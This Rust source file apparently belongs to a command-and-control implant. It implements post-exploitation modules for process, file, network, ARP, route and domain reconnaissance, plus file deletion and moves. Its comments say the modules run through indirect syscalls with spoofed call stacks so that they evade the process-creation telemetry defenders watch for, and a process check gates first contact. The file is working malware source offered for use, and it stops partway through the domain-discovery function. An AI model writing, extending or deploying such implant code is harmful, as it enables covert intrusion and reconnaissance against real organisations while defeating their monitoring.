//! In-process task modules (ABR-T011): built-in collection primitives
//! executed inside the implant on the session thread — no child
//! processes, no new threads. Routine post-exploitation needs (process
//! discovery, file listing, file read, self-identification, network
//! state, environment) no longer require `cmd.exe /C` shell tasks, whose
//! process-creation telemetry is the noisiest artifact of a classic C2.
//! NT-based modules dispatch through the indirect-syscall layer
//! (ABR-T005/T009/T010), so even the collection syscalls run with a
//! spoofed call stack.

// On-demand FFI pattern: resolutions transmute a walked export address
// into a typed fn pointer whose signature is the let binding right
// there. clippy::missing_transmute_annotations wants the type repeated
// at the transmute itself — noise in this idiom, so it is silenced
// file-wide.
#![allow(clippy::missing_transmute_annotations)]

use crate::evasion::syscalls;

/// Module names accepted by [`run`] — also the operator help line.
pub const NAMES: &str = "ps, ls <path>, cat <path>, mkdir <path>, rm <path>, mv <src> <dst>, cp <src> <dst>, whoami, netstat, arp, route, domain, disks, services, env";

/// Runs a built-in module by name. `args` semantics are per module.
pub fn run(name: &str, args: &str) -> Result<Vec<u8>, String> {
    match name.trim() {
        "ps" => processes(),
        "ls" => listing(args.trim()),
        "cat" => read_file(args.trim()),
        "mkdir" => make_dir(args.trim()),
        "rm" => remove_path(args.trim()),
        "mv" => move_path(args.trim()),
        "cp" => copy_path(args.trim()),
        "whoami" => whoami(),
        "netstat" => netstat(),
        "arp" => arp_table(),
        "route" => route_table(),
        "domain" => domain_info(),
        "disks" => disks(),
        "services" => services(),
        "env" => environment(),
        other => Err(format!("unknown module '{other}' (available: {NAMES})")),
    }
}

const STATUS_INFO_LENGTH_MISMATCH: u32 = 0xC000_0004;
const SYSTEM_PROCESS_INFORMATION: usize = 5;

/// Process discovery through spoofed indirect
/// `NtQuerySystemInformation(SystemProcessInformation)` — TSV output:
/// pid, ppid, threads, handles, name, image path, command line. The
/// syscall returns the same data `tasklist` would show, with none of the
/// process/CONHOST telemetry; path and command line come from a
/// per-process `NtQueryInformationProcess` pass (protected processes
/// degrade to `-` columns).
fn processes() -> Result<Vec<u8>, String> {
    let query = unsafe { syscalls::resolve("NtQuerySystemInformation") }
        .ok_or_else(|| "NtQuerySystemInformation unresolved".to_string())?;
    let mut buffer = vec![0u8; 0x8000];
    let rows = loop {
        let mut needed = 0usize;
        let status = unsafe {
            syscalls::dispatch6(
                query,
                SYSTEM_PROCESS_INFORMATION, // class is the first argument
                buffer.as_mut_ptr() as usize,
                buffer.len(),
                &mut needed as *mut usize as usize,
                0,
                0,
            )
        };
        // NTSTATUS convention: the kernel returns the 32-bit code; treat
        // it as u32 before severity tests.
        let nt = status as u32 as i32;
        if nt >= 0 {
            break parse_processes(&buffer);
        }
        if nt as u32 != STATUS_INFO_LENGTH_MISMATCH {
            return Err(format!(
                "NtQuerySystemInformation failed: {:#010x}",
                nt as u32
            ));
        }
        buffer.resize(buffer.len() * 2, 0);
    };
    let mut out = String::from("pid\tppid\tthreads\thandles\tname\tpath\tcmdline\tuser\n");
    for row in rows {
        out.push_str(&row);
        out.push('\n');
    }
    Ok(out.into_bytes())
}

fn parse_processes(buffer: &[u8]) -> Vec<String> {
    let read_u16 = |off: usize| -> Option<u16> {
        buffer
            .get(off..off + 2)
            .map(|b| u16::from_le_bytes([b[0], b[1]]))
    };
    let read_u32 = |off: usize| -> Option<u32> {
        buffer
            .get(off..off + 4)
            .map(|b| u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
    };
    let read_usize = |off: usize| -> Option<usize> {
        buffer.get(off..off + 8).map(|b| {
            let mut bytes = [0u8; 8];
            bytes.copy_from_slice(b);
            usize::from_le_bytes(bytes)
        })
    };
    let mut rows = Vec::new();
    let mut offset = 0usize;
    while let Some(next) = read_u32(offset) {
        let threads = read_u32(offset + 4).unwrap_or(0);
        // SYSTEM_PROCESS_INFORMATION (x64): ImageName UNICODE_STRING at
        // +0x38 (Length) / +0x40 (Buffer), UniqueProcessId +0x50,
        // InheritedFromUniqueProcessId +0x58, HandleCount +0x60.
        let name_len = read_u16(offset + 0x38).unwrap_or(0) as usize;
        let name_ptr = read_usize(offset + 0x40).unwrap_or(0);
        let pid = read_usize(offset + 0x50).unwrap_or(0);
        let ppid = read_usize(offset + 0x58).unwrap_or(0);
        let handles = read_u32(offset + 0x60).unwrap_or(0);
        let name = if name_len > 0 && name_ptr != 0 {
            read_utf16z(name_ptr, name_len)
        } else {
            "System".to_string()
        };
        let (path, cmdline, user) = query_process_details(pid as u64);
        rows.push(format!(
            "{pid}\t{ppid}\t{threads}\t{handles}\t{name}\t{path}\t{cmdline}\t{user}"
        ));
        if next == 0 {
            break;
        }
        offset += next as usize;
    }
    rows
}

/// True when any named process is running (case-insensitive, name only
/// — no per-process queries). The environment gate (T035) polls this
/// before first contact and while dormant.
pub fn any_process_running(names: &[String]) -> bool {
    if names.is_empty() {
        return false;
    }
    let Some(query) = (unsafe { syscalls::resolve("NtQuerySystemInformation") }) else {
        return false;
    };
    let mut buffer = vec![0u8; 0x8000];
    loop {
        let mut needed = 0usize;
        let status = unsafe {
            syscalls::dispatch6(
                query,
                SYSTEM_PROCESS_INFORMATION,
                buffer.as_mut_ptr() as usize,
                buffer.len(),
                &mut needed as *mut usize as usize,
                0,
                0,
            )
        };
        let nt = status as u32 as i32;
        if nt < 0 && nt as u32 == STATUS_INFO_LENGTH_MISMATCH {
            buffer.resize(buffer.len() * 2, 0);
            continue;
        }
        if nt < 0 {
            return false;
        }
        break;
    }
    // Walk the same SYSTEM_PROCESS_INFORMATION chain as `ps`, comparing
    // image names only.
    let read_u16 = |off: usize| -> Option<u16> {
        buffer
            .get(off..off + 2)
            .map(|b| u16::from_le_bytes([b[0], b[1]]))
    };
    let read_u32 = |off: usize| -> Option<u32> {
        buffer
            .get(off..off + 4)
            .map(|b| u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
    };
    let read_usize = |off: usize| -> Option<usize> {
        buffer.get(off..off + 8).map(|b| {
            let mut bytes = [0u8; 8];
            bytes.copy_from_slice(b);
            usize::from_le_bytes(bytes)
        })
    };
    let mut offset = 0usize;
    while let Some(next) = read_u32(offset) {
        let name_len = read_u16(offset + 0x38).unwrap_or(0) as usize;
        let name_ptr = read_usize(offset + 0x40).unwrap_or(0);
        let name = if name_len > 0 && name_ptr != 0 {
            read_utf16z(name_ptr, name_len)
        } else {
            "System".to_string()
        };
        if names
            .iter()
            .any(|want| want.trim().eq_ignore_ascii_case(&name))
        {
            return true;
        }
        if next == 0 {
            break;
        }
        offset += next as usize;
    }
    false
}

#[repr(C)]
#[derive(Default, Clone, Copy)]
struct ClientId {
    unique_process: usize,
    unique_thread: usize,
}

#[repr(C)]
#[derive(Default, Clone, Copy)]
struct ObjectAttributes {
    length: u32,
    root_directory: usize,
    object_name: usize,
    attributes: u32,
    security_descriptor: usize,
    security_quality_of_service: usize,
}

const PROCESS_QUERY_LIMITED_INFORMATION: usize = 0x1000;
const CURRENT_PROCESS: usize = usize::MAX;
const PROCESS_IMAGE_FILE_NAME: usize = 27;
const PROCESS_COMMAND_LINE: usize = 60;
const TOKEN_QUERY: usize = 0x0008;
const TOKEN_USER_CLASS: usize = 1;
const STATUS_MASK: u32 = 0x8000_0000;

/// (image path, command line, owner) for one PID through
/// `NtQueryInformationProcess` + a token query on a QUERY_LIMITED
/// handle; details degrade to `-` when the process cannot be opened
/// (protected) or a class is withheld.
fn query_process_details(pid: u64) -> (String, String, String) {
    let query = match unsafe { syscalls::resolve("NtQueryInformationProcess") } {
        Some(q) => q,
        None => return ("-".into(), "-".into(), "-".into()),
    };
    let close = match unsafe { syscalls::resolve("NtClose") } {
        Some(c) => c,
        None => return ("-".into(), "-".into(), "-".into()),
    };
    let handle = if pid == std::process::id() as u64 {
        CURRENT_PROCESS
    } else {
        let open = match unsafe { syscalls::resolve("NtOpenProcess") } {
            Some(o) => o,
            None => return ("-".into(), "-".into(), "-".into()),
        };
        let mut attributes = ObjectAttributes {
            length: std::mem::size_of::<ObjectAttributes>() as u32,
            ..Default::default()
        };
        let cid = ClientId {
            unique_process: pid as usize,
            unique_thread: 0,
        };
        let mut opened: usize = 0;
        let status = unsafe {
            syscalls::dispatch6(
                open,
                &mut opened as *mut usize as usize,
                PROCESS_QUERY_LIMITED_INFORMATION,
                &mut attributes as *mut ObjectAttributes as usize,
                &cid as *const ClientId as usize,
                0,
                0,
            )
        };
        if (status as u32) & STATUS_MASK != 0 || opened == 0 {
            return ("-".into(), "-".into(), "-".into());
        }
        opened
    };
    let owned = handle != CURRENT_PROCESS;
    let path = query_unicode_class(query, handle, PROCESS_IMAGE_FILE_NAME);
    let cmdline = query_unicode_class(query, handle, PROCESS_COMMAND_LINE);
    let user = query_process_user(handle);
    if owned {
        unsafe { syscalls::dispatch6(close, handle, 0, 0, 0, 0, 0) };
    }
    (path, cmdline, user)
}

/// Best-effort process owner: open the process token (TOKEN_QUERY) and
/// resolve the user SID through `LookupAccountSidW`. `-` on any failure
/// (access denied, resolver absent).
fn query_process_user(handle: usize) -> String {
    let open_token = match unsafe { syscalls::resolve("NtOpenProcessToken") } {
        Some(s) => s,
        None => return "-".into(),
    };
    let query_token = match unsafe { syscalls::resolve("NtQueryInformationToken") } {
        Some(s) => s,
        None => return "-".into(),
    };
    let lookup: unsafe extern "system" fn(
        usize,
        *mut u16,
        *mut u32,
        *mut u16,
        *mut u32,
        *mut u32,
    ) -> i32 = match unsafe { syscalls::export_address("advapi32.dll", "LookupAccountSidW") } {
        Some(addr) => unsafe { std::mem::transmute(addr) },
        None => return "-".into(),
    };
    let mut token: usize = 0;
    let status = unsafe {
        syscalls::dispatch6(
            open_token,
            handle,
            TOKEN_QUERY,
            &mut token as *mut usize as usize,
            0,
            0,
            0,
        )
    };
    if (status as u32) & STATUS_MASK != 0 || token == 0 {
        return "-".into();
    }
    let mut buffer = [0u8; 256];
    let mut returned = 0usize;
    let status = unsafe {
        syscalls::dispatch6(
            query_token,
            token,
            TOKEN_USER_CLASS,
            buffer.as_mut_ptr() as usize,
            buffer.len(),
            &mut returned as *mut usize as usize,
            0,
        )
    };
    if (status as u32) & STATUS_MASK != 0 {
        return "-".into();
    }
    // TOKEN_USER: SID_AND_ATTRIBUTES { Sid: *SID, Attributes } — the
    // SID lives inside the same buffer.
    let sid = usize::from_le_bytes([
        buffer[0], buffer[1], buffer[2], buffer[3], buffer[4], buffer[5], buffer[6], buffer[7],
    ]);
    let start = buffer.as_ptr() as usize;
    if sid < start || sid + 8 > start + buffer.len() {
        return "-".into();
    }
    let mut name = [0u16; 256];
    let mut domain = [0u16; 256];
    let mut name_len = name.len() as u32;
    let mut domain_len = domain.len() as u32;
    let mut sid_type = 0u32;
    let ok = unsafe {
        lookup(
            sid,
            name.as_mut_ptr(),
            &mut name_len,
            domain.as_mut_ptr(),
            &mut domain_len,
            &mut sid_type,
        )
    };
    if ok == 0 {
        return "-".into();
    }
    let domain_text = String::from_utf16_lossy(&domain[..domain_len as usize]);
    let name_text = String::from_utf16_lossy(&name[..name_len as usize]);
    if domain_text.is_empty() {
        name_text
    } else {
        format!("{domain_text}\\{name_text}")
    }
}

/// One `NtQueryInformationProcess` call returning a UNICODE_STRING
/// written into our buffer; `-` on failure.
fn query_unicode_class(query: syscalls::Syscall, handle: usize, class: usize) -> String {
    let mut buffer = [0u8; 4096];
    let mut returned = 0usize;
    let status = unsafe {
        syscalls::dispatch6(
            query,
            handle,
            class,
            buffer.as_mut_ptr() as usize,
            buffer.len(),
            &mut returned as *mut usize as usize,
            0,
        )
    };
    if (status as u32) & STATUS_MASK != 0 {
        return "-".into();
    }
    // The kernel writes the UNICODE_STRING at buffer start; its Buffer
    // points inside the same allocation for these classes.
    let len = u16::from_le_bytes([buffer[0], buffer[1]]) as usize;
    let ptr = usize::from_le_bytes([
        buffer[8], buffer[9], buffer[10], buffer[11], buffer[12], buffer[13], buffer[14],
        buffer[15],
    ]);
    let start = buffer.as_ptr() as usize;
    if len == 0 || ptr < start || ptr + len > start + buffer.len() {
        return "-".into();
    }
    let offset = ptr - start;
    String::from_utf16_lossy(
        &buffer[offset..offset + len]
            .as_chunks::<2>()
            .0
            .iter()
            .map(|pair| u16::from_le_bytes(*pair))
            .collect::<Vec<u16>>(),
    )
}

/// Reads a null-terminated UTF-16 string from the system-information
/// buffer (the UNICODE_STRING lengths include the terminator).
fn read_utf16z(ptr: usize, byte_len: usize) -> String {
    let mut units = Vec::with_capacity(byte_len / 2);
    for step in 0..byte_len / 2 {
        let unit = unsafe {
            u16::from_le_bytes([
                std::ptr::read_volatile((ptr + step * 2) as *const u8),
                std::ptr::read_volatile((ptr + step * 2 + 1) as *const u8),
            ])
        };
        if unit == 0 {
            break;
        }
        units.push(unit);
    }
    String::from_utf16_lossy(&units)
}

/// Directory listing — TSV: type, size, name.
fn listing(path: &str) -> Result<Vec<u8>, String> {
    if path.is_empty() {
        return Err("ls requires a path".into());
    }
    let dir = std::fs::read_dir(path).map_err(|e| format!("{path}: {e}"))?;
    let mut rows: Vec<(bool, u64, String)> = Vec::new();
    for entry in dir {
        let entry = entry.map_err(|e| format!("{path}: {e}"))?;
        let meta = entry.metadata().map_err(|e| format!("{path}: {e}"))?;
        rows.push((
            meta.is_dir(),
            meta.len(),
            entry.file_name().to_string_lossy().into_owned(),
        ));
    }
    rows.sort_by(|a, b| a.2.cmp(&b.2));
    let mut out = String::from("type\tsize\tname\n");
    for (is_dir, len, name) in rows {
        out.push_str(if is_dir { "d\t" } else { "f\t" });
        out.push_str(&len.to_string());
        out.push('\t');
        out.push_str(&name);
        out.push('\n');
    }
    Ok(out.into_bytes())
}

/// Small-file read, capped so a fat target cannot balloon the result
/// into an endless chunk transfer (use the DOWNLOAD task for that).
const CAT_CAP: usize = 512 * 1024;

fn read_file(path: &str) -> Result<Vec<u8>, String> {
    if path.is_empty() {
        return Err("cat requires a path".into());
    }
    let mut data = std::fs::read(path).map_err(|e| format!("{path}: {e}"))?;
    if data.len() > CAT_CAP {
        data.truncate(CAT_CAP);
        data.extend_from_slice(b"\n[i] truncated at 512 KiB - use download\n");
    }
    Ok(data)
}

/// Self-identification from the process environment block plus the NT
/// registration primitives (real parent PID, token integrity, OS build).
fn whoami() -> Result<Vec<u8>, String> {
    let env = |key: &str| std::env::var(key).unwrap_or_default();
    let integrity = crate::selfinfo::integrity().unwrap_or(0);
    let integrity_name = match integrity {
        1 => "low",
        2 => "medium",
        3 => "high",
        4 => "system",
        5 => "protected",
        _ => "unknown",
    };
    Ok(format!(
        "{}\\{}@{}\npid={} ppid={} integrity={integrity_name}\nbuild={}\n",
        env("USERDOMAIN"),
        env("USERNAME"),
        env("COMPUTERNAME"),
        std::process::id(),
        crate::selfinfo::ppid().unwrap_or(0),
        crate::selfinfo::os_build().unwrap_or_default(),
    )
    .into_bytes())
}

/// Process environment block dump — `KEY=VALUE` per line, no API calls.
fn environment() -> Result<Vec<u8>, String> {
    let mut out = String::new();
    for (key, value) in std::env::vars_os() {
        out.push_str(&key.to_string_lossy());
        out.push('=');
        out.push_str(&value.to_string_lossy());
        out.push('\n');
    }
    Ok(out.into_bytes())
}

// --- netstat: owner-PID socket tables through iphlpapi ---

type ExtendedTableFn = unsafe extern "system" fn(*mut u8, *mut u32, i32, u32, u32, u32) -> u32;

const ERROR_INSUFFICIENT_BUFFER: u32 = 122;
const AF_INET: u32 = 2;
const AF_INET6: u32 = 23;
const TCP_TABLE_OWNER_PID_ALL: u32 = 5;
const UDP_TABLE_OWNER_PID_ALL: u32 = 1;

fn tcp_state(state: u32) -> &'static str {
    match state {
        2 => "LISTEN",
        3 => "SYN_SENT",
        4 => "SYN_RCVD",
        5 => "ESTAB",
        6 => "FIN_WAIT1",
        7 => "FIN_WAIT2",
        8 => "CLOSE_WAIT",
        9 => "CLOSING",
        10 => "LAST_ACK",
        11 => "TIME_WAIT",
        12 => "DELETE_TCB",
        _ => "UNKNOWN",
    }
}

/// IPv4 (v4-byte network-order u32) to dotted quad. Ports are stored in
/// network byte order in the low 16 bits of the DWORD.
fn dotted(addr: u32) -> String {
    format!(
        "{}.{}.{}.{}",
        addr & 0xff,
        (addr >> 8) & 0xff,
        (addr >> 16) & 0xff,
        (addr >> 24) & 0xff
    )
}

fn network_port(word: u32) -> u32 {
    ((word & 0xff) << 8) | ((word >> 8) & 0xff)
}

/// Compact IPv6 rendering: hextets lower-case hex with the longest
/// run of zero groups collapsed to `::` (RFC 5952 essentials).
fn ipv6(addr: &[u8]) -> String {
    let groups: Vec<u16> = (0..8)
        .map(|i| u16::from_be_bytes([addr[i * 2], addr[i * 2 + 1]]))
        .collect();
    let mut best = (0usize, 0usize); // (start, len) of longest zero run
    let mut run = (0usize, 0usize);
    for (i, group) in groups.iter().enumerate() {
        if *group == 0 {
            if run.1 == 0 {
                run.0 = i;
            }
            run.1 += 1;
            if run.1 > best.1 {
                best = run;
            }
        } else {
            run.1 = 0;
        }
    }
    if best.1 < 2 {
        best = (0, 0);
    }
    let head: Vec<String> = groups[..best.0].iter().map(|g| format!("{g:x}")).collect();
    let tail: Vec<String> = groups[best.0 + best.1..]
        .iter()
        .map(|g| format!("{g:x}"))
        .collect();
    if best.1 == 0 {
        head.join(":")
    } else {
        format!("{}::{}", head.join(":"), tail.join(":"))
    }
}

/// Calls GetExtended{Tcp,Udp}Table sized through the classic two-call
/// pattern; returns the raw table buffer.
fn extended_table(func: ExtendedTableFn, family: u32, table_class: u32) -> Result<Vec<u8>, String> {
    let mut size: u32 = 0;
    unsafe { func(std::ptr::null_mut(), &mut size, 1, family, table_class, 0) };
    if size == 0 {
        return Err("socket table size probe returned zero".into());
    }
    let mut buffer = vec![0u8; size as usize];
    let code = unsafe { func(buffer.as_mut_ptr(), &mut size, 1, family, table_class, 0) };
    if code == ERROR_INSUFFICIENT_BUFFER {
        return Err("socket table kept growing".into());
    }
    if code != 0 {
        return Err(format!("socket table query failed: {code}"));
    }
    Ok(buffer)
}

/// Listening/established sockets with owning PID — the in-process
/// counterpart of `netstat -ano` (IPv4; IPv6 tables are a follow-up).
fn netstat() -> Result<Vec<u8>, String> {
    let tcp_addr = unsafe { syscalls::export_address("iphlpapi.dll", "GetExtendedTcpTable") }
        .ok_or("GetExtendedTcpTable unresolved")?;
    let udp_addr = unsafe { syscalls::export_address("iphlpapi.dll", "GetExtendedUdpTable") }
        .ok_or("GetExtendedUdpTable unresolved")?;
    let tcp: ExtendedTableFn = unsafe { std::mem::transmute(tcp_addr) };
    let udp: ExtendedTableFn = unsafe { std::mem::transmute(udp_addr) };

    let mut out = String::from("proto\tlocal\tremote\tstate\tpid\n");
    if let Ok(table) = extended_table(tcp, AF_INET, TCP_TABLE_OWNER_PID_ALL) {
        let read_u32 = |off: usize| -> u32 {
            u32::from_le_bytes([table[off], table[off + 1], table[off + 2], table[off + 3]])
        };
        let entries = read_u32(0) as usize;
        for i in 0..entries {
            let row = 4 + i * 24; // MIB_TCPROW_OWNER_PID: 6 DWORDs
            if row + 24 > table.len() {
                break;
            }
            let state = read_u32(row);
            let local = read_u32(row + 4);
            let local_port = read_u32(row + 8);
            let remote = read_u32(row + 12);
            let remote_port = read_u32(row + 16);
            let pid = read_u32(row + 20);
            out.push_str(&format!(
                "tcp\t{}:{}\t{}:{}\t{}\t{pid}\n",
                dotted(local),
                network_port(local_port),
                dotted(remote),
                network_port(remote_port),
                tcp_state(state)
            ));
        }
    }
    // IPv6: TCP6 row = 16B local addr + scope + port, remote triple,
    // state, pid (56B); UDP6 row = addr + scope + port + pid (28B).
    if let Ok(table) = extended_table(tcp, AF_INET6, TCP_TABLE_OWNER_PID_ALL) {
        let read_u32 = |off: usize| -> u32 {
            u32::from_le_bytes([table[off], table[off + 1], table[off + 2], table[off + 3]])
        };
        let entries = read_u32(0) as usize;
        for i in 0..entries {
            let row = 4 + i * 56;
            if row + 56 > table.len() {
                break;
            }
            let state = read_u32(row + 48);
            let local_port = read_u32(row + 20);
            let remote_port = read_u32(row + 44);
            let pid = read_u32(row + 52);
            out.push_str(&format!(
                "tcp6	[{}]:{}	[{}]:{}	{}	{pid}
",
                ipv6(&table[row..row + 16]),
                network_port(local_port),
                ipv6(&table[row + 24..row + 40]),
                network_port(remote_port),
                tcp_state(state)
            ));
        }
    }
    if let Ok(table) = extended_table(udp, AF_INET6, UDP_TABLE_OWNER_PID_ALL) {
        let read_u32 = |off: usize| -> u32 {
            u32::from_le_bytes([table[off], table[off + 1], table[off + 2], table[off + 3]])
        };
        let entries = read_u32(0) as usize;
        for i in 0..entries {
            let row = 4 + i * 28;
            if row + 28 > table.len() {
                break;
            }
            let local_port = read_u32(row + 20);
            let pid = read_u32(row + 24);
            out.push_str(&format!(
                "udp6	[{}]:{}	-	-	{pid}
",
                ipv6(&table[row..row + 16]),
                network_port(local_port)
            ));
        }
    }
    if let Ok(table) = extended_table(udp, AF_INET, UDP_TABLE_OWNER_PID_ALL) {
        let read_u32 = |off: usize| -> u32 {
            u32::from_le_bytes([table[off], table[off + 1], table[off + 2], table[off + 3]])
        };
        let entries = read_u32(0) as usize;
        for i in 0..entries {
            let row = 4 + i * 12; // MIB_UDPROW_OWNER_PID: 3 DWORDs
            if row + 12 > table.len() {
                break;
            }
            let local = read_u32(row);
            let local_port = read_u32(row + 4);
            let pid = read_u32(row + 8);
            out.push_str(&format!(
                "udp\t{}:{}\t-\t-\t{pid}\n",
                dotted(local),
                network_port(local_port)
            ));
        }
    }
    Ok(out.into_bytes())
}

// --- filesystem modules (T028): in-process ops on the session thread ---
// std::fs already runs in-process; these exist so routine file
// management never needs a cmd.exe child (the noisiest C2 artifact).

/// Creates a directory (parents included).
fn make_dir(path: &str) -> Result<Vec<u8>, String> {
    if path.is_empty() {
        return Err("mkdir requires a path".into());
    }
    std::fs::create_dir_all(path).map_err(|e| format!("{path}: {e}"))?;
    Ok(format!("created {path}\n").into_bytes())
}

/// Deletes a file or a directory tree.
fn remove_path(path: &str) -> Result<Vec<u8>, String> {
    if path.is_empty() {
        return Err("rm requires a path".into());
    }
    let meta = std::fs::symlink_metadata(path).map_err(|e| format!("{path}: {e}"))?;
    if meta.is_dir() {
        std::fs::remove_dir_all(path).map_err(|e| format!("{path}: {e}"))?;
    } else {
        std::fs::remove_file(path).map_err(|e| format!("{path}: {e}"))?;
    }
    Ok(format!("removed {path}\n").into_bytes())
}

/// Splits "<src> <dst>" module arguments.
fn two_paths(args: &str) -> Result<(String, String), String> {
    let mut parts = args.split_whitespace();
    match (parts.next(), parts.next()) {
        (Some(src), Some(dst)) => Ok((src.to_string(), dst.to_string())),
        _ => Err("requires <src> <dst>".into()),
    }
}

/// Moves/renames a file or directory tree.
fn move_path(args: &str) -> Result<Vec<u8>, String> {
    let (src, dst) = two_paths(args)?;
    std::fs::rename(&src, &dst).map_err(|e| format!("{src} -> {dst}: {e}"))?;
    Ok(format!("moved {src} -> {dst}\n").into_bytes())
}

/// Copies a file (a directory copy degrades to a listing hint).
fn copy_path(args: &str) -> Result<Vec<u8>, String> {
    let (src, dst) = two_paths(args)?;
    let meta = std::fs::symlink_metadata(&src).map_err(|e| format!("{src}: {e}"))?;
    if meta.is_dir() {
        return Err(format!("{src} is a directory - cp copies files only"));
    }
    std::fs::copy(&src, &dst).map_err(|e| format!("{src} -> {dst}: {e}"))?;
    Ok(format!("copied {src} -> {dst}\n").into_bytes())
}

// --- survey modules (T029): network/domain/disk/service inventory ---
// All resolved through the manual export walker (no import-table
// additions), executed on the session thread.

type FnPtrToU32 = unsafe extern "system" fn(usize) -> u32;

fn wide(text: &str) -> Vec<u16> {
    text.encode_utf16().chain(std::iter::once(0)).collect()
}

/// ARP table through `GetIpNetTable` — TSV: iface, address, mac, type.
fn arp_table() -> Result<Vec<u8>, String> {
    let get: unsafe extern "system" fn(*mut u8, *mut u32, i32) -> u32 =
        match unsafe { syscalls::export_address("iphlpapi.dll", "GetIpNetTable") } {
            Some(addr) => unsafe { std::mem::transmute(addr) },
            None => return Err("GetIpNetTable unresolved".into()),
        };
    let mut size = 0u32;
    let mut table = Vec::new();
    loop {
        let rc = unsafe { get(table.as_mut_ptr(), &mut size, 1) };
        if rc == 0 {
            break;
        }
        if rc != 122 {
            // ERROR_INSUFFICIENT_BUFFER
            return Err(format!("GetIpNetTable: {rc}"));
        }
        table.resize(size as usize, 0);
    }
    if table.len() < 4 {
        return Err("empty ARP table".into());
    }
    let read_u32 = |off: usize| -> u32 {
        u32::from_le_bytes([table[off], table[off + 1], table[off + 2], table[off + 3]])
    };
    let entries = read_u32(0) as usize;
    let mut out = String::from("iface\taddress\tmac\ttype\n");
    for i in 0..entries {
        let row = 4 + i * 24; // MIB_IPNETROW: 24 bytes
        if row + 24 > table.len() {
            break;
        }
        let entry_type = read_u32(row + 20);
        if entry_type == 2 {
            continue; // invalid
        }
        let mac_len = read_u32(row + 4).min(8) as usize;
        let mac = (0..mac_len)
            .map(|b| format!("{:02x}", table[row + 8 + b]))
            .collect::<Vec<_>>()
            .join("-");
        let kind = match entry_type {
            1 => "other",
            3 => "dynamic",
            4 => "static",
            _ => "unknown",
        };
        out.push_str(&format!(
            "{}\t{}\t{mac}\t{kind}\n",
            read_u32(row),
            dotted(read_u32(row + 16))
        ));
    }
    Ok(out.into_bytes())
}

/// IPv4 routing table through `GetIpForwardTable` — TSV: dest, mask,
/// next hop, metric, iface.
fn route_table() -> Result<Vec<u8>, String> {
    let get: unsafe extern "system" fn(*mut u8, *mut u32, i32) -> u32 =
        match unsafe { syscalls::export_address("iphlpapi.dll", "GetIpForwardTable") } {
            Some(addr) => unsafe { std::mem::transmute(addr) },
            None => return Err("GetIpForwardTable unresolved".into()),
        };
    let mut size = 0u32;
    let mut table = Vec::new();
    loop {
        let rc = unsafe { get(table.as_mut_ptr(), &mut size, 1) };
        if rc == 0 {
            break;
        }
        if rc != 122 {
            return Err(format!("GetIpForwardTable: {rc}"));
        }
        table.resize(size as usize, 0);
    }
    if table.len() < 4 {
        return Err("empty routing table".into());
    }
    let read_u32 = |off: usize| -> u32 {
        u32::from_le_bytes([table[off], table[off + 1], table[off + 2], table[off + 3]])
    };
    let entries = read_u32(0) as usize;
    let mut out = String::from("dest\tmask\tnexthop\tmetric\tiface\n");
    for i in 0..entries {
        let row = 4 + i * 56; // MIB_IPFORWARDROW: 14 DWORDs
        if row + 56 > table.len() {
            break;
        }
        out.push_str(&format!(
            "{}\t{}\t{}\t{}\t{}\n",
            dotted(read_u32(row)),
            dotted(read_u32(row + 4)),
            dotted(read_u32(row + 12)),
            read_u32(row + 36), // ForwardMetric1
            read_u32(row + 16)  // ForwardIfIndex
        ));
    }
    Ok(out.into_bytes())
}

/// Reads a null-terminated UTF-16 string from a raw pointer.
unsafe fn utf16_at(ptr: usize) -> String {
    if ptr == 0 {
        return "-".into();
    }
    let mut len = 0usize;
    let mut probe = ptr as *const u16;
    while *probe != 0 && len < 512 {
        len += 1;
        probe = probe.add(1);
    }
    String::from_utf16_lossy(std::slice::from_raw_parts(ptr as *const u16, len))
}

/// Domain posture: join state (NetGetJoinInformation), DC info
/// (DsGetDcNameW), DNS names (GetComputerNameExW) and logon env hints.
fn domain_info() -> Result<Vec<u8>, String> {
    let mut out = String::new();
    let netapi =
        |name: &str| -> Option<usize> { unsafe { syscalls::export_address("netapi32.dll", name) } };
    let join: unsafe extern "system" fn(usize, *mut usize, *mut u32) -> u32 =
        match netapi("NetGetJoinInformation") {
            Some(addr) => unsafe { std::mem::transmute(addr) },
            None => return Err("NetGetJoinInformation unresolved".into()),
        };
    let free: FnPtrToU32 = match netapi("NetApiBufferFree") {
        Some(addr) => unsafe { std::mem::transmute(addr) },
        None => return Err("NetApiBufferFree unresolved".into()),
    };
    let mut domain_ptr = 0usize;
    let mut join_type = 0u32;
    let rc = unsafe { join(0, &mut domain_ptr, &mut join_type) };
    if rc == 0 && domain_ptr != 0 {
        let text = unsafe { utf16_at(domain_ptr) };
        let state = match join_type {
            1 => "unknown",
            2 => "workgroup",
            3 => "domain-joined (workstation)",
            4 => "domain-joined (server)",
            _ => "unknown",
        };
        out.push_str(&format!("join={state} domain/workgroup={text}\n"));
        unsafe { free(domain_ptr) };
    } else {
        out.push_str(&format!("join=query failed ({rc})\n"));
    }

    // DC discovery: fails cleanly on non-joined hosts.
    if let Some(addr) = netapi("DsGetDcNameW") {
        let dc: unsafe extern "system" fn(usize, usize, usize, usize, u32, *mut usize) -> u32 =
            unsafe { std::mem::transmute(addr) };
        let mut info = 0usize;
        // DS_RETURN_DNS_NAME | DS_DIRECTORY_SERVICE_REQUIRED
        let rc = unsafe { dc(0, 0, 0, 0, 0x4000_0010, &mut info) };
        if rc == 0 && info != 0 {
            let field = |offset: usize| -> String {
                let ptr = usize::from_le_bytes(
                    unsafe { std::slice::from_raw_parts((info + offset) as *const u8, 8) }
                        .try_into()
                        .unwrap(),
                );
                unsafe { utf16_at(ptr) }
            };
            out.push_str(&format!(
                "dc={}\ndomain={}\nforest={}\ndc_site={}\nclient_site={}\n",
                field(0).trim_start_matches(r"\\"),
                field(40),
                field(48),
                field(64),
                field(72)
            ));
            unsafe { free(info) };
        } else {
            out.push_str("dc=none (not domain-joined or discovery failed)\n");
        }
    }

    // DNS identity of the machine.
    if let Some(addr) = unsafe { syscalls::export_address("kernel32.dll", "GetComputerNameExW") } {
        let name_ex: unsafe extern "system" fn(u32, *mut u16, *mut u32) -> i32 =
            unsafe { std::mem::transmute(addr) };
        for (class, label) in [(1u32, "dns_hostname"), (2u32, "dns_domain"), (3u32, "fqdn")] {
            let mut buffer = [0u16; 256];
            let mut len = buffer.len() as u32;
            if unsafe { name_ex(class, buffer.as_mut_ptr(), &mut len) } != 0 {
                let text = String::from_utf16_lossy(&buffer[..len as usize]);
                out.push_str(&format!("{label}={text}\n"));
            }
        }
    }
